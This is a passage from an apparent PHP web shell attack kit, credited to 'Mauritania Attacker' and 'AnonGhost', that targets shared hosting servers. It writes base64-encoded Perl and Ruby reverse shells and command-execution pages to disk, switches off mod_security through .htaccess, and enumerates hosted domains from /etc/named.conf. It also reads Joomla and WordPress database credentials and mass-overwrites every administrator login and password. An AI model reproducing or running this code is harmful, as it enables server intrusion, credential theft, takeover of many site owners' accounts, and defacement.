FuZHN7IG1hcmdpbi1sZWZ0OiAzNTBweDsgbWFyZ2luLXJpZ2h0OiAzNTBweDsgfSBvcHRpb257IGNvbG9yOiAjNzc3Nzc3OyB9PC9zdHlsZT4NCjw/cGhwDQplY2hvICc8YnI+PGNlbnRlcj48Yj48Zm9udCBjb2xvcj0iIzAwNzcwMCIgZmFjZT0iVGFob21hIiBzdHlsZT0iZm9udC1zaXplOiAxMXB0Ij5Db21tYW5kOiBydWJ5ICcuZ2V0Y3dkKCkuJy9yZXZiYWNray5yYiBwb3J0IGhvc3Q8L2ZvbnQ+PC9iPjxjZW50ZXI+PGJyPic7DQplY2hvICc8Zm9udCBmYWNlPSJUYWhvbWEiIGFsaWduPSJjZW50ZXIiIHNpemU9IjIiIGNvbG9yPSJncmVlbiI+IENvZGVkIEJ5IE1hdXJpdGFuaWEgQXR0YWNrZXIgPC9mb250Pic7DQplY2hvJzxwIGFsaWduPSJjZW50ZXIiPiA8aW1nIHNyYz0iaHR0cHM6Ly93d3ctdHJvcG8tY29tLnMzLmFtYXpvbmF3cy5jb20vd3AtY29udGVudC91cGxvYWRzLzIwMTAvMDgvcnVieS1sb2dvLTUxMjEucG5nIiAgd2lkdGg9IjE3NCIgaGVpZ2h0PSIyMDAiID48L3A+DQo8Zm9ybSBtZXRob2Q9Z2V0IGFjdGlvbj0iJy4kbWUuJyI+DQo8cD48dGV4dGFyZWEgY2xhc3M9ImFyZWEiIHJvd3M9IjEzIiBuYW1lPSJTMSIgY29scz0iNzAiID4nOw0KDQppZiAoc3RybGVuKCRfR0VUWydjb21tYW5kJ10pPjEgJiYgJF9HRVRbJ2V4ZWNtZXRob2QnXSE9InBvcGVuIil7DQplY2hvICRfR0VUWydleGVjbWV0aG9kJ10oJF9HRVRbJ2NvbW1hbmQnXSk7fQ0KaWYgKHN0cmxlbigkX1BPU1RbJ2NvbW1hbmQnXSk+MSAmJiAkX1BPU1RbJ2V4ZWNtZXRob2QnXSE9InBvcGVuIil7DQplY2hvICRfUE9TVFsnZXhlY21ldGhvZCddKCRfUE9TVFsnY29tbWFuZCddKTt9DQoNCmlmIChzdHJsZW4oJF9HRVRbJ2NvbW1hbmQnXSk+MSAmJiAkX0dFVFsnZXhlY21ldGhvZCddPT0icG9wZW4iKXsNCnBvcGVuKCRfR0VUWydjb21tYW5kJ10sInIiKTt9DQoNCmVjaG8nPC90ZXh0YXJlYT48L3A+DQo8cD48Y2VudGVyPjxmb250IGZhY2U9IkdlbmV2YSIgYWxpZ249ImNlbnRlciIgc2l6ZT0iMiIgY29sb3I9IiMwMDc3MDAiPklmIG5vdGhpbmcgd29yayBpdCBtZWFucyB0aGF0IHJ1YnkgaXMgbm90IGVuYWJsZWQgaW4gdGhpcyBzZXJ2ZXIgOig8L2ZvbnQ+PC9jZW50ZXI+PC9wPg0KPHAgYWxpZ249ImNlbnRlciI+DQo8Zm9udCBmYWNlPSJHZW5ldmEiIGFsaWduPSJjZW50ZXIiIHNpemU9IjMiIGNvbG9yPSIjMDA5OTAwIj5Db21tYW5kOiBydWJ5ICcuZ2V0Y3dkKCkuJy9yZXZiYWNray5yYiBwb3J0IGhvc3Q8L2ZvbnQ+PGlucHV0IHR5cGU9aGlkZGVuIG5hbWU9InZ3IiBzaXplPSI1MCIgdmFsdWU9ImNtZCI+IDxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJjb21tYW5kIiBzaXplPSI0MyI+IDxzZWxlY3QgbmFtZT1leGVjbWV0aG9kPg0KPG9wdGlvbiB2YWx1ZT0ic3lzdGVtIj5TeXN0ZW08L29wdGlvbj4gIDxvcHRpb24gdmFsdWU9ImV4ZWMiPkV4ZWM8L29wdGlvbj4gIDxvcHRpb24gdmFsdWU9InBhc3N0aHJ1Ij5QYXNzdGhydTwvb3B0aW9uPjxvcHRpb24gdmFsdWU9InBvcGVuIj5wb3Blbjwvb3B0aW9uPg0KPC9zZWxlY3Q+IDxpbnB1dCB0eXBlPSJzdWJtaXQiIHZhbHVlPSJFeGVjdXRlIj4NCjwvcD48L2Zvcm0+JzsNCj8+';
$file = fopen("rubbbber.php" ,"w+");
$write = fwrite ($file ,base64_decode($merdeeeee));
fclose($file);

echo "<br><center><span style='font-size:30px; font-family:Fredericka the Great; color:#009900'>Ruby Back Connect Shell</span><center><br><iframe src=rubrub/rubbbber.php width=75% height=60% frameborder=0></iframe></div></center>"; 
}


if(isset($_GET['action']) && $_GET['action'] == 'prlbckacnonect'){
echo '<center><b class="conte">
<a href="?action=mysqslsls">MySQL & PostgreSql Connect</a> -
<a href="?action=cmd">Command Execution</a> -
<a href="?action=com64">Base64 Command</a> -
<a href="?action=vgrab">Config Grabber</a> -
<a href="?action=subdomainchkrezes">Subdomain Checker</a> -
<a href="?action=joomlarvrssrvetll">Joomla Reverse Server</a> -    
<a href="?action=wordddprssrrrvrse">Wordpress Reverse Server</a> -
<a href="?action=cari">Find Directory Writable/Readable</a> -
<a href="?action=zonh">Zone-h Notifier</a> -
<a href="?action=shhhshell">Shtml Command Shell</a> -
<a href="?action=beko">Back connect Simple</a> -
<a href="?action=rubybckconnnect">Ruby BackConnect</a> -
<a href="?action=prlbckacnonect">Perl BackConnect</a> -
<a href="?action=pythnonbakcncete">Python BackConnect</a> -
<a href="?action=exploit">Exploit</a> -
<a href="?action=whmcskillrer">Whcms Killer</a> -
<a href="?action=webmllllpwdchnger">Webmail Password Changer</a> -
<a href="?action=wpcdrfex">Wordpress Csrf Exploit</a>
</center>
</b>';

mkdir('Backperlrev', 0755);
chdir('Backperlrev');
$kokwkwkwkwkw = ".htaccess";
$wkwkwkwkw_adi = "$kokwkwkwkwkw";
$wkwkwkwkw = fopen ($wkwkwkwkw_adi , 'w') or die ("wkwkwkwkw a&#231;&#305;lamad&#305;!");
$zilzil = "<IfModule mod_security.c>
SecFilterEngine Off
SecFilterScanPOST Off
</IfModule>";    
fwrite ( $wkwkwkwkw , $zilzil ) ;
fclose ($wkwkwkwkw);
$shellololol = 'dXNlIElPOjpTb2NrZXQ7DQokc3lzdGVtICA9ICcvYmluL2Jhc2gnOw0KJEFSR0M9QEFSR1Y7DQpwcmludCAiQW5vbkdob3N0IEJBQ0stQ09OTkVDVCBCQUNLRE9PUlxuXG4iOw0KaWYgKCRBUkdDIT0yKSB7DQogICBwcmludCAiVXNhZ2U6ICQwIFtIb3N0XSBbUG9ydF0gXG5cbiI7DQogICBkaWUgIkV4OiAkMCAxMjcuMC4wLjEgMjEyMSBcbiI7DQp9DQp1c2UgU29ja2V0Ow0KdXNlIEZpbGVIYW5kbGU7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgZ2V0cHJvdG9ieW5hbWUoJ3RjcCcpKSBvciBkaWUgcHJpbnQgIlstXSBVbmFibGUgdG8gUmVzb2x2ZSBIb3N0IDooXG4iOw0KY29ubmVjdChTT0NLRVQsIHNvY2thZGRyX2luKCRBUkdWWzFdLCBpbmV0X2F0b24oJEFSR1ZbMF0pKSkgb3IgZGllIHByaW50ICJbLV0gVW5hYmxlIHRvIENvbm5lY3QgSG9zdCA6KFxuIjsNCnByaW50ICJbKl0gUmVzb2x2aW5nIEhvc3ROYW1lXG4iOw0KcHJpbnQgIlsqXSBDb25uZWN0aW5nLi4uICRBUkdWWzBdIFxuIjsNCnByaW50ICJbKl0gU3Bhd25pbmcgU2hlbGwgXG4iOw0KcHJpbnQgIlsqXSBDb25uZWN0ZWQgdG8gcmVtb3RlIGhvc3QgXCEvIFxuIjsNClNPQ0tFVC0+YXV0b2ZsdXNoKCk7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RET1VULCI+JlNPQ0tFVCIpOw0Kb3BlbihTVERFUlIsIj4mU09DS0VUIik7DQpwcmludCAiQW5vbkdob3N0IEJBQ0stQ09OTkVDVCBCQUNLRE9PUiAgXG5cbiI7DQpzeXN0ZW0oInVuc2V0IEhJU1RGSUxFOyB1bnNldCBTQVZFSElTVDtlY2hvIC0tPT1TeXN0ZW1pbmZvPT0tLTsgdW5hbWUgLWE7ZWNobzsNCmVjaG8gLS09PVVzZXJpbmZvPT0tLTsgaWQ7ZWNobztlY2hvIC0tPT1EaXJlY3Rvcnk9PS0tOyBwd2Q7ZWNobzsgZWNobyAtLT09U2hlbGw9PS0tICIpOw0Kc3lzdGVtKCRzeXN0ZW0pOw==';

$zerer = fopen("reverse.pl" ,"w+");
$write = fwrite ($zerer ,base64_decode($shellololol));
fclose($zerer);
chmod("reverse.pl",0755);

//extract php command shell
$zonop = 'PGh0bWw+PGhlYWQ+PHRpdGxlPkFub25HaG9zdCBQZXJsIENvbm5lY3QgU2hlbGwgUHJpdjg8L3RpdGxlPjxsaW5rIHJlbD0ic2hvcnRjdXQgaWNvbiIgaHJlZj0iaHR0cDovL3d3dzE0LjB6ejAuY29tLzIwMTQvMDYvMDQvMjEvMzk2NTU0Mzk0LnBuZyIgdHlwZT0iaW1hZ2UveC1pY29uIiAvPjxzdHlsZSB0eXBlPSJ0ZXh0L2NzcyI+DQpib2R5eyBiYWNrZ3JvdW5kLWNvbG9yOiAjMjIyMjIyICFpbXBvcnRhbnQ7IGNvbG9yOiAjMDA5OTAwOyB0ZXh0LXNoYWRvdzojMDAwIDBweCAycHggN3B4O30gICAgICBhe3RleHQtZGVjb3JhdGlvbjpub25lOyBmb250LWZhbWlseTogVGFob21hLCBHZW5ldmE7IGNvbG9yOiMwMDc3MDA7IHBhZGRpbmc6MnB4IDJweDt9ICAgICAgYTpob3Zlcntjb2xvcjojMDA5OTAwOyB0ZXh0LXNoYWRvdzojMDBmZjAwIDBweCAwcHggM3B4O30JICAuYXJlYSB7IGNvbG9yOiAjMDBiYjAwOyBmb250LXNpemU6IDlwdDsgdGV4dC1zaGFkb3c6IzAwMDAwMCAwcHggMnB4IDdweDsgYm9yZGVyOiBzb2xpZCAwcHggIzAwNzcwMDsgYmFja2dyb3VuZC1jb2xvcjp0cmFuc3BhcmVudDsgYm94LXNoYWRvdzogMHB4IDBweCA0cHggIzAwOTkwMDsgICAgcGFkZGluZzogM3B4OyAgIC13ZWJraXQtYm9yZGVyLXJhZGl1czogNHB4OyAgIC1tb3otYm9yZGVyLXJhZGl1czogNHB4OyAgIGJvcmRlci1yYWRpdXM6IDRweDsgICAtd2Via2l0LWJveC1zaGFkb3c6IHJnYigwLDExOSwwKSAwcHggMHB4IDRweDsgICAtbW96LWJveC1zaGFkb3c6IHJnYigwLDExOSwwKSAwcHggMHB4IDRweDsgfQkgIGlucHV0W3R5cGU9c3VibWl0XXsgcGFkZGluZzogM3B4OyBjb2xvcjogIzAwNzcwOyAgZm9udC13ZWlnaHQ6IGJvbGQ7IHRleHQtYWxpZ246IGNlbnRlcjsgIHRleHQtc2hhZG93OiAwIDFweCByZ2JhKDI1NSwgMjU1LCAyNTUsIDAuMyk7ICBiYWNrZ3JvdW5kOiAjYWVhZWFlOyAgYmFja2dyb3VuZC1jbGlwOiBwYWRkaW5nLWJveDsgIGJvcmRlcjogMXB4IHNvbGlkICMyODQ0NzM7ICBib3JkZXItYm90dG9tLWNvbG9yOiAjMjIzYjY2OyAgYm9yZGVyLXJhZGl1czogNHB4OyAgY3Vyc29yOiBwb2ludGVyOyAgYmFja2dyb3VuZC1pbWFnZTotd2Via2l0LWxpbmVhci1ncmFkaWVudCh0b3AsICNlYWVhZWEsICNkMGQwZDApOyAgYmFja2dyb3VuZC1pbWFnZTogLW1vei1saW5lYXItZ3JhZGllbnQodG9wLCAjZWFlYWVhLCAjZDBkMGQwKTsgIGJhY2tncm91bmQtaW1hZ2U6IC1vLWxpbmVhci1ncmFkaWVudCh0b3AsICNlYWVhZWEsICNkMGQwZDApOyAgYmFja2dyb3VuZC1pbWFnZTogbGluZWFyLWdyYWRpZW50KHRvIGJvdHRvbSwgI2VhZWFlYSwgI2QwZDBkMCk7ICAtd2Via2l0LWJveC1zaGFkb3c6IGluc2V0IDAgMXB4IHJnYmEoMjU1LCAyNTUsIDI1NSwgMC41KSwgaW5zZXQgMCAwIDdweCByZ2JhKDI1NSwgMjU1LCAyNTUsIDAuNCksIDAgMXB4IDFweCByZ2JhKDAsIDAsIDAsIDAuMTUpOyAgYm94LXNoYWRvdzogaW5zZXQgMCAxcHggcmdiYSgyNTUsIDI1NSwgMjU1LCAwLjUpLCBpbnNldCAwIDAgN3B4IHJnYmEoMjU1LCAyNTUsIDI1NSwgMC40KSwgMCAxcHggMXB4IHJnYmEoMCwgMCwgMCwgMC4xNSk7IH0gaW5wdXRbdHlwZT10ZXh0XXsgcGFkZGluZzogM3B4OyBjb2xvcjogIzAwOTkwMDsgdGV4dC1zaGFkb3c6ICM3Nzc3NzcgMHB4IDBweCAzcHg7IGJvcmRlcjogMXB4IHNvbGlkICMwMDc3MDA7IGJhY2tncm91bmQ6IHRyYW5zcGFyZW50OyBib3gtc2hhZG93OiAwcHggMHB4IDRweCAjMDA3NzAwOyAgICBwYWRkaW5nOiAzcHg7ICAgLXdlYmtpdC1ib3JkZXItcmFkaXVzOiA0cHg7ICAgLW1vei1ib3JkZXItcmFkaXVzOiA0cHg7ICAgYm9yZGVyLXJhZGl1czogNHB4OyAgIC13ZWJraXQtYm94LXNoYWRvdzogcmdiKDg1LDg1LDg1KSAwcHggMHB4IDRweDsgICAtbW96LWJveC1zaGFkb3c6IHJnYig4NSw4NSw4NSkgMHB4IDBweCA0cHg7fSBpbnB1dFt0eXBlPXN1Ym1pdF06aG92ZXIsIGlucHV0W3R5cGU9dGV4dF06aG92ZXJ7IGNvbG9yOiAjZmZmZmZmOyB0ZXh0LXNoYWRvdzogIzAwNjYwMCAwcHggMHB4IDRweDsgYm94LXNoYWRvdzogMHB4IDBweCA0cHggIzAwZGQwMDsgYm9yZGVyOiAxcHggc29saWQgIzAwZGQwMDsgICAgcGFkZGluZzogM3B4OyAgIC13ZWJraXQtYm9yZGVyLXJhZGl1czogNHB4OyAgIC1tb3otYm9yZGVyLXJhZGl1czogNHB4OyAgIGJvcmRlci1yYWRpdXM6IDRweDsgICAtd2Via2l0LWJveC1zaGFkb3c6IHJnYmEoMCwxMTksMCkgMHB4IDBweCA0cHg7ICAgLW1vei1ib3gtc2hhZG93OiByZ2JhKDAsMTE5LDApIDBweCAwcHggNHB4O30gc2VsZWN0eyBwYWRkaW5nOiAzcHg7IHdpZHRoOiAxNjJweDsgY29sb3I6ICMwMGFhMDA7IHRleHQtc2hhZG93OiMwMDAgMHB4IDJweCA3cHg7IGJvcmRlcjogMXB4IHNvbGlkICMwMDc3MDA7IGJhY2tncm91bmQ6IHRyYW5zcGFyZW50OyB0ZXh0LWRlY29yYXRpb246IG5vbmU7IGJveC1zaGFkb3c6IDBweCAwcHggNHB4ICMwMGFhMDA7ICBwYWRkaW5nOiAzcHg7ICAgLXdlYmtpdC1ib3JkZXItcmFkaXVzOiA0cHg7ICAgLW1vei1ib3JkZXItcmFkaXVzOiA0cHg7ICAgYm9yZGVyLXJhZGl1czogNHB4OyAgIC13ZWJraXQtYm94LXNoYWRvdzogcmdiKDg1LCA4NSwgODUpIDBweCAwcHggNHB4OyAgIC1tb3otYm94LXNoYWRvdzogcmdiKDg1LCA4NSwgODUpIDBweCAwcHggNHB4O30gc2VsZWN0OmhvdmVyeyBib3JkZXI6IDFweCBzb2xpZCAjMDBkZDAwOyBib3gtc2hhZG93OiAwcHggMHB4IDRweCAjMDBkZDAwOyAgIHBhZGRpbmc6IDNweDsgICAtd2Via2l0LWJvcmRlci1yYWRpdXM6IDRweDsgICAtbW96LWJvcmRlci1yYWRpdXM6IDRweDsgICBib3JkZXItcmFkaXVzOiA0cHg7ICAgLXdlYmtpdC1ib3gtc2hhZG93OiByZ2JhKDAsMTE5LDApIDBweCAwcHggNHB4OyAgIC1tb3otYm94LXNoYWRvdzogcmdiYSgwLDExOSwwKSAwcHggMHB4IDRweDt9ICAgI2NvbW1hbmRzeyBtYXJnaW4tbGVmdDogMzUwcHg7IG1hcmdpbi1yaWdodDogMzUwcHg7IH0gb3B0aW9ueyBjb2xvcjogIzc3Nzc3NzsgfTwvc3R5bGU+DQo8P3BocA0KZWNobyAnPGNlbnRlcj48Zm9udCBjb2xvcj0iIzAwNzcwMCIgZmFjZT0iVGFob21hIiBzdHlsZT0iZm9udC1zaXplOiAxMXB0Ij5Vc2FnZTogcmV2ZXJzZS5wbCBbSG9zdF0gW1BvcnRdPC9mb250Pjxicj4nOw0KZWNobyc8cCBhbGlnbj0iY2VudGVyIj4gDQo8aW1nIGJvcmRlcj0iMCIgc3JjPSJodHRwOi8vd3d3OS4wenowLmNvbS8yMDE0LzA4LzIwLzE5LzQ3MDA3MTkzOS5wbmciPjwvcD48Zm9udCBmYWNlPSJHZW5ldmEiIGFsaWduPSJjZW50ZXIiIHNpemU9IjIiIGNvbG9yPSIjMDA3NzAwIj4gQ29kZWQgQnkgTWF1cml0YW5pYSBBdHRhY2tlciA8L2ZvbnQ+PGJyPg0KPGZvcm0gbWV0aG9kPWdldCBhY3Rpb249IicuJG1lLiciPg0KPHRleHRhcmVhIGNsYXNzPSJhcmVhIiByb3dzPSIxMyIgbmFtZT0iUzEiIGNvbHM9IjcwIiA+JzsNCg0KaWYgKHN0cmxlbigkX0dFVFsnY29tbWFuZCddKT4xICYmICRfR0VUWydleGVjbWV0aG9kJ10hPSJwb3BlbiIpew0KZWNobyAkX0dFVFsnZXhlY21ldGhvZCddKCRfR0VUWydjb21tYW5kJ10pO30NCmlmIChzdHJsZW4oJF9QT1NUWydjb21tYW5kJ10pPjEgJiYgJF9QT1NUWydleGVjbWV0aG9kJ10hPSJwb3BlbiIpew0KZWNobyAkX1BPU1RbJ2V4ZWNtZXRob2QnXSgkX1BPU1RbJ2NvbW1hbmQnXSk7fQ0KDQppZiAoc3RybGVuKCRfR0VUWydjb21tYW5kJ10pPjEgJiYgJF9HRVRbJ2V4ZWNtZXRob2QnXT09InBvcGVuIil7DQpwb3BlbigkX0dFVFsnY29tbWFuZCddLCJyIik7fQ0KDQplY2hvJzwvdGV4dGFyZWE+DQo8cD48Y2VudGVyPklmIG5vdGhpbmcgd29yayBpdCBtZWFucyB0aGF0IHBlcmwgaXMgbm90IGVuYWJsZWQgaW4gdGhpcyBzZXJ2ZXIgOig8L2NlbnRlcj48L3A+DQo8cCBhbGlnbj0iY2VudGVyIj48c3Ryb25nPkNvbW1hbmQ6IHBlcmwgcmV2ZXJzZS5wbCB5b3VySVAgUG9ydDwvc3Ryb25nPjxpbnB1dCB0eXBlPWhpZGRlbiBuYW1lPSJ2dyIgc2l6ZT0iNTAiIHZhbHVlPSJjbWQiPiA8aW5wdXQgdHlwZT0idGV4dCIgbmFtZT0iY29tbWFuZCIgc2l6ZT0iNDMiPiA8c2VsZWN0IG5hbWU9ZXhlY21ldGhvZD4NCjxvcHRpb24gdmFsdWU9InN5c3RlbSI+U3lzdGVtPC9vcHRpb24+ICA8b3B0aW9uIHZhbHVlPSJleGVjIj5FeGVjPC9vcHRpb24+ICA8b3B0aW9uIHZhbHVlPSJwYXNzdGhydSI+UGFzc3RocnU8L29wdGlvbj48b3B0aW9uIHZhbHVlPSJwb3BlbiI+cG9wZW48L29wdGlvbj4NCjwvc2VsZWN0PiA8aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0iRXhlY3V0ZSI+DQo8L3A+PC9mb3JtPic7DQo/Pg==';
$file = fopen("kit.php" ,"w+");
$write = fwrite ($file ,base64_decode($zonop));
fclose($file);

echo "<br><center><span style='font-size:30px; font-family:Fredericka the Great; color:#009900'>Perl Connect Shell Priv8</span></b><center><br><iframe src=Backperlrev/kit.php width=75% height=60% frameborder=0></iframe></div></center>";
}

if(isset($_GET['action']) && $_GET['action'] == 'joomla'){
echo '<center><b class="conte">
<a href="?action=mass">Mass Deface Dirs</a> -
<a href="?action=joomla">Mass Change Admin Joomla</a> -
<a href="?action=vb">Mass Change Admin vBulletin</a> -
<a href="?action=wp">Mass Change Admin WordPress</a> -
<a href="?action=wpandjmlamassdfce">Wordpress & Joomla Mass Deface</a> -
<a href="?action=wrdprshtmlinj">Wordpress Index Hijack Priv8</a> -
<a href="?action=joommlallainxc">Joomla Index Changer</a> -
<a href="?action=wpidxcngrdesr">Wordpress Index Changer</a> -
<a href="?action=cpnlndftpotdfr">Cpanel & Ftp Auto Defacer</a> </center>
</b>';
echo '<br><center><span style="font-size:30px; font-family:Fredericka the Great; color:#009900">Mass Change Admin Joomla</span><center><br>';
if(isset($_POST['s'])){

$file = @file_get_contents('joomla.txt');

$ex   = explode("\n",$file);


echo "<div class='tmp'><table align='center' width='40%'><td> <font color='#e4e4e4'><b>Domains </b></font></td><td> <font color='#e4e4e4'><b>Configs </b></font></td><td> <font color='#e4e4e4'><b>Result </b></font></td></div>";
flush();


foreach ($ex as $exp){

$es   = explode("||",$exp);

$config = $es[0];

$domin = $es[1];

$domins = trim($domin).'';

$readconfig  = @file_get_contents(trim($config));

if(ereg('JConfig',$readconfig)){


$pass    =  ex($readconfig,'$password = \'',"';");
$userdb  =  ex($readconfig,'$user = \'',"';");
$db      =  ex($readconfig,'$db = \'',"';");
$fix     =  ex($readconfig,'$dbprefix = \'',"';");
$tab     =  $fix.'users';
$con     = @mysql_connect('localhost',$userdb,$pass);
$db      = @mysql_select_db($db,$con);
$query   = @mysql_query("UPDATE `$tab`  SET `username` ='virusa'");
$query3  = @mysql_query("UPDATE `$tab`  SET `password` ='0a3329119bf465dce95057a37ec91152:TL1fIDogLJU4bHHcgQWETu8GN67fUd8'");
if ($query and $query3 ){$r = '<b style="color: #ee5500">Succeed </b>user [virusa] pass [worm]</b>';}else{$r = '<b style="color:red">failed</b>';}
$domins = trim($domin).'';
echo "<tr>
<td><div class='cone'><a target='_blank' href='http://$domins'>$domin</a></div></td>
<td><div class='cone'><a target='_blank' href='$config'>config</a></td><td>".$r."</td></div></tr>";
flush();

}else{

echo "<tr>
<td><div class='cone'><a target='_blank' href='http://$domins'>$domin</a></div></td>
<td><div class='cone'><a target='_blank' href='http://$exp'>config</a></div></td><td><b style='color:red'>failed</b></td></tr>";
flush();

}
}

die();

}

if(!is_file('named.txt')){

$d00m = @file("/etc/named.conf");

flush();

}else{

$d00m = file("named.txt");

}
if(!$d00m)
{
die ("<meta http-equiv='refresh' content='0; url=?action=read'/>");
}
else
{
echo "<br><div class='tmp'>
<form method='POST' action='$pg?action=joomla'>
<input type='submit' value='Mass change Admin' />
<input type='hidden' value='1' name='s' />
</form><br>
<table align='center' width='40%'><td> <font color='#e4e4e4'><b>Domains </b></font></td><td> <font color='#e4e4e4'><b>Config </b></font></td><td> <font color='#e4e4e4'><b>Result </b></font></td>";

$f = fopen('joomla.txt','w');

foreach($d00m as $dom){

if(eregi("zone",$dom)){

preg_match_all('#zone "(.*)"#', $dom, $domvw);

if(strlen(trim($domvw[1][0])) > 2){

$user = posix_getpwuid(@fileowner("/etc/valiases/".$domvw[1][0]));


$wpl=$pageURL."/sim/rut/home/".$user['name']."/public_html/configuration.php";
$wpp=get_headers($wpl);
$wp=$wpp[0];

$wp2=$pageURL."/sim/rut/home/".$user['name']."/public_html/blog/configuration.php";
$wpp2=get_headers($wp2);
$wp12=$wpp2[0];

$wp3=$pageURL."/sim/rut/home/".$user['name']."/public_html/joomla/configuration.php";
$wpp3=get_headers($wp3);
$wp13=$wpp3[0];


$pos = strpos($wp, "200");
$config="&nbsp;";

if (strpos($wp, "200") == true )
{
 $config= $wpl;
}
elseif (strpos($wp12, "200") == true)
{
  $config= $wp2;
}
elseif (strpos($wp13, "200") == true)
{
  $config= $wp3;
}
else
{
continue;

}
flush();

$dom = $domvw[1][0];

$w = fwrite($f,"$config||$dom \n");
if($w){$r = '<b style="color: #ee5500">Save</b>';}else{$r = '<b style="color:red">failed</b>';}

echo "<tr><td><div class='cone'><a href=http://www.".$domvw[1][0].">".$domvw[1][0]."</a></div></td>
<td><div class='cone'><a href='$config'>config</a></div></td><td>".$r."</td></tr>";

flush();

}
}
}
}
echo "</table></div><br><br>";
}
if(isset($_GET['action']) && $_GET['action'] == 'wp'){
echo '<center><b class="conte">
<a href="?action=mass">Mass Deface Dirs</a> -
<a href="?action=joomla">Mass Change Admin Joomla</a> -
<a href="?action=vb">Mass Change Admin vBulletin</a> -
<a href="?action=wp">Mass Change Admin WordPress</a> -
<a href="?action=wpandjmlamassdfce">Wordpress & Joomla Mass Deface</a> -
<a href="?action=wrdprshtmlinj">Wordpress Index Hijack Priv8</a> -
<a href="?action=joommlallainxc">Joomla Index Changer</a> -
<a href="?action=wpidxcngrdesr">Wordpress Index Changer</a> -
<a href="?action=cpnlndftpotdfr">Cpanel & Ftp Auto Defacer</a> </center>
</b>';
echo '<br><center><span style="font-size:30px; font-family:Fredericka the Great; color:#009900">Mass Change Admin Mass WordPress</span><center><br>';
if(isset($_POST['s'])){

$file = @file_get_contents('wp.txt');

$ex   = explode("\n",$file);

echo "<div class='tmp'><table align='center' width='40%'><td> <font color='#e4e4e4'><b>Domains </b></font></td><td> <font color='#e4e4e4'><b>Configs </b></font></td><td> <font color='#e4e4e4'><b>Result </b></font></td></div>";
flush();
flush();


foreach ($ex as $exp){

$es   = explode("||",$exp);

$config = $es[0];

$domin = $es[1];

$domins = trim($domin).'';

$readconfig  = @file_get_contents(trim($config));

if(ereg('wp-settings.php',$readconfig)){



$pass    =  ex($readconfig,"define('DB_PASSWORD', '","');");

$userdb  =  ex($readconfig,"define('DB_USER', '","');");

$db      =  ex($readconfig,"define('DB_NAME', '","');");

$fix     =  ex($readconfig,'$table_prefix  = \'',"';");

$tab     = $fix.'users';

$con     = @mysql_connect('localhost',$userdb,$pass);

$db      = @mysql_select_db($db,$con);

$query   = @mysql_query("UPDATE `$tab` SET `user_login` ='virusa'") or die;

$query   = @mysql_query("UPDATE `$tab` SET `user_pass` ='$1$4z/.5i..$9aHYB.fUHEmNZ.eIKYTwx/'") or die;



if ($query){$r = '<b style="color: #ee5500">Succeed </b>user [virusa] pass [1]</b>';}

else

{

$r = '<b style="color:red">failed</b>';

}

$domins = trim($domin).'';

echo "<tr>
<td><div class='cone'><a target='_blank' href='http://$domins'>$domin</a></div></td>
<td><div class='cone'><a target='_blank' href='$config'>config</a></div></td><td>".$r."</td></tr>";

flush();
flush();

}else{

echo "<tr>
<td><div class='cone'><a target='_blank' href='http://$domins'>$domin</a></div></td>
<td><div class='cone'><a target='_blank' href='http://$config'>config</a></div></td><td><b style='color:red'>failed2</b></td></tr>";

flush();
flush();

}
}

die();

}

if(!is_file('named.txt')){

$d00m = @file("/etc/named.conf");

}else{

$d00m = @file("named.txt");

}
if(!$d00m)
{
die ("<meta http-equiv='refresh' content='0; url=?action=read'/>");
}
else
{
echo "<br><div class='tmp'>
<form method='POST' action='$pg?action=wp'>
<input type='submit' value='Mass Change Admin' />
<input type='hidden' value='1' name='s' />
</form>
<br>
<table align='center' width='40%'><td> <font color='#e4e4e4'><b>Domains </b></font></td><td> <font color='#e4e4e4'><b>Config </b></font></td><td> <font color='#e4e4e4'><b>Result </b></font></td>";

flush();
flush();

$f = fopen('wp.txt','w');

foreach($d00m as $dom){

if(eregi("zone",$dom)){

preg_match_all('#zone "(.*)"#', $dom, $domvw);

if(strlen(trim($domvw[1][0])) > 2){

$user = posix_getpwuid(@fileowner("/etc/valiases/".$domvw[1][0]));

$wpl=$pageURL."/sim/rut/home/".$user['name']."/public_html/wp-config.php";
$wpp=get_headers($wpl);
$wp=$wpp[0];

$wp2=$pageURL."/sim/rut/home/".$user['name']."/public_html/blog/wp-config.php";
$wpp2=get_headers($wp2);
$wp12=$wpp2[0];

$wp3=$pageURL."/sim/rut/home/".$user['name']."/public_html/wp/wp-config";
$wpp3=get_headers($wp3);
$wp13=$wpp3[0];

$pos = strpos($wp, "200");
$config="&nbsp;";

if (strpos($wp, "200") == true )
{
 $config= $wpl;
}
elseif (strpos($wp12, "200") == true)
{
  $config= $wp2;
}
elseif (strpos($wp13, "200") == true)
{
  $config= $wp3;
}
else
{
continue;

}
flush();

$dom = $domvw[1][0];

$w = fwrite($f,"$config||$dom \n");
if($w){$r = '<b style="color: #ee5500">Save</b>';}else{$r = '<b style="color:red">failed</b>';}

echo "<tr><td><div class='cone'><a href=http://www.".$domvw[1][0].">".$domvw[1][0]."</a></div></td>
<td><div class='cone'><a href='$config'>Config</a></div></td><td>".$r."</td></tr>";
flush();
flush();

flush();

}
}
}
}
echo "</table></div><br><br>";
}
if(isset($_GET['action']) && $_GET['action'] == 'vb'){
echo '<center><b class="conte">
<a href="?action=mass">Mass Deface Dirs</a> -
<a href="?action=joomla">Mass Change Admin Joomla</a> -
<a href="?action=vb">Mass Change Admin vBulletin</a> -
<a href="?action=wp">Mass Change Admin WordPress</a> -
<a href="?action=wpandjmlamassdfce">Wordpress & Joomla Mass Deface</a> -
<a href="?action=wrdprshtmlinj">Wordpress Index Hijack Priv8</a> -
<a href="?action=joommlallainxc">Joomla Index Changer</a> -
<a href="?action=wpidxcngrdesr">Wordpress Index Changer</a> -
<a href="?action=cpnlndftpotdfr">Cpanel & Ftp Auto Defacer</a> </center>
</b>';
echo '<br><center><span style="font-size:30px; font-family:Fredericka the Great; color:#009900">Mass Change Admin vBulletin</span><center><br>';
if(isset($_POST['s'])){

$file = @file_get_contents('vb.txt');

$ex   = explode("\n",$file);

echo "<div class='tmp'><table align='center' width='40%'><td> <font color='#e4e4e4'><b>Domains </b><font></td><td> <font color='#e4e4e4'><b>Configs </b><font></td><td> <font color='#e4e4e4'><b>Result </b><font></td></div>";

foreach ($ex as $exp){

$es   = explode("||",$exp);

$config = $es[0];

$domin = $es[1];

$domins = trim($domin).'';

$readconfig  = @file_get_contents(trim($config));

